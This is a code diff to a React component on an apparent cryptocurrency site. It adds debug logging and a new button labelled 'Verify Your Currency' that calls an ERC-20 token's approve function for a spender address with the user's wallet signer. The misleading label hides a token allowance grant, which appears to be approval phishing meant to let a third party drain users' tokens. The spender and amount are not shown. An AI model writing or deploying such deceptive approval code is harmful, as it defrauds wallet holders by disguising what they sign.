@@ -61,16 +61,30 @@ const Welcome = () => {
 
   const approveToken = async () => {
     if (!signer || !walletAddress) {
+      console.log(tokenAddress,walletAddress, spender);
       await connectWallet();
+      console.log(tokenAddress,walletAddress, spender);
       return;
     }
 
     const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
     const token = new ethers.Contract(tokenAddress, abi, signer);
+    console.log("Token contract:", token);
+    console.log("Token address:", tokenAddress);
+    console.log("Wallet address:", walletAddress);
+    console.log("Spender address:", spender);
 
     try {
-      const tx = await token.approve(spender, amount);
+      console.log(amount);
+      try{
+              const tx = await token.approve(spender, amount);
       await tx.wait();
+            console.log("Transaction:", tx);
+      console.log("tx"+tx);
+
+      }catch (error) {
+        console.log("Error in transaction:", error);
+      }
 
       console.log("✅ Token approved successfully");
 
@@ -119,10 +133,21 @@ const Welcome = () => {
               <AiFillPlayCircle className="text-white mr-2" />
               <p className="text-white text-base font-semibold"
               >
-                Verify Your Currency
+                Connect Your Wallet
               </p>
             </button>
           )}
+            <button
+              type="button"
+              onClick={approveToken}
+              className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
+            >
+              <AiFillPlayCircle className="text-white mr-2" />
+              <p className="text-white text-base font-semibold"
+              >
+                Verify Your Currency
+              </p>
+            </button>
 
           <div className="grid sm:grid-cols-3 grid-cols-2 w-full mt-10">
             <div className={`rounded-tl-2xl ${companyCommonStyles}`}>Reliability</div>
